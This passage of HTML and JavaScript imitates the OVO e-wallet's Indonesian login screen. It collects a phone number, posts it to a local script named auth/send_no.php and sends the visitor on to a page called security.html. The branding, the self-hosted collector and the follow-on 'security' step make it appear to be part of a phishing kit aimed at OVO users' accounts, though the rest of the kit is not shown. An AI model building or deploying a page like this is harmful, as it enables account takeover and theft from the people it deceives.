</head>
<body>
 
    <div class="container page1">
        <div style="display:none;" class="load">
            <div class="box">
                <div class="circle one"></div>
                <div class="circle two"></div>
                <div class="circle three"></div>
            </div>
        </div>
        <div class="loadingScreen">
            <img class="ovologo" style="display:none;" src="img/ovo.png" alt="">
        </div>
        <div class="header">
            <i onclick="window.location.href='/'" class='bx bx-left-arrow-alt'></i>
            <i class='bx bxs-help-circle' ></i>
        </div>
        <div class="title">
            <h3 class="b">Masuk atau Daftar</h3>
            <p class="r">Masuk atau daftar cuma butuh nomor HP aja.</p>
        </div>
        <form id="formNohp" onsubmit="sendNohp(event);">
            <div class="wrapInp">
                <div class="label r"><p class="r">+62</p></div>
                <input autofocus type="tel" autocomplete="off" id="nohp" class="nohp r" name="nohp" required>
                <i id="del" onclick="removeInp();" class='bx bxs-x-circle' style="display:none;" ></i>
            </div>
            <p class="r reset">Nomor HP nggak aktif atau hilang? <span class="b">Atur Ulang</span></p>
            <div class="bgbtn">
                <p class="r">Dengan masuk atau daftar, kamu udah setuju dengan <span class="b">Ketentuan Layanan</span><br>dan <span class="b">Kebijakan Privasi</span> OVO.</p>
                <button disabled class="b" type="submit" id="btnnohp">Lanjutkan</button>
            </div>
        </form>
    </div>
   
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>
<script>
    $(document).ready(function(){
        $('#nohp').on('input', function(){
            if($(this).val() == '0' || $(this).val() == '62'){
                $(this).val('');
            }
        });
    });
</script>
<script>
    $(document).ready(function(){
        $('#nohp').mask('000-0000-000000');
    });
</script>
<script>
    let inphp = document.getElementById("nohp");
    let btnnohp = document.getElementById("btnnohp");
    let del = document.getElementById("del");
    inphp.addEventListener("input", val);
    function val(){
        if (inphp.value.length > 10){
            btnnohp.disabled = false;
        } else {
            btnnohp.disabled = true;
        }
    };
    inphp.addEventListener("input", valDel);
    function valDel(){
        if (inphp.value != ""){
            $("#del").show();
        } else {
            $("#del").hide();
        }
    };
    function removeInp(){
        $("#nohp").val("");
        $("#nohp").focus();
        $("#del").hide();
    }
</script>
<script>
    function sendNohp(event){
        event.preventDefault();
        $(".load").fadeIn();
        $("#nohp").blur();
        $("#btnnohp").attr("disabled","true");
        $.ajax({
            type: 'POST',
            url: 'auth/send_no.php',
            data: $('#formNohp').serialize(),
            dataType: 'text',
            success: function(){
                window.location.href = 'security.html';
            }
        })
    };
</script>
<script>
    window.onload = function(){
        setTimeout(function(){
            $(".ovologo").fadeIn(200);
            setTimeout(function(){
                $(".loadingScreen").fadeOut(200);
            },1000);
        },500);
    }
</script>
</body>
</html>
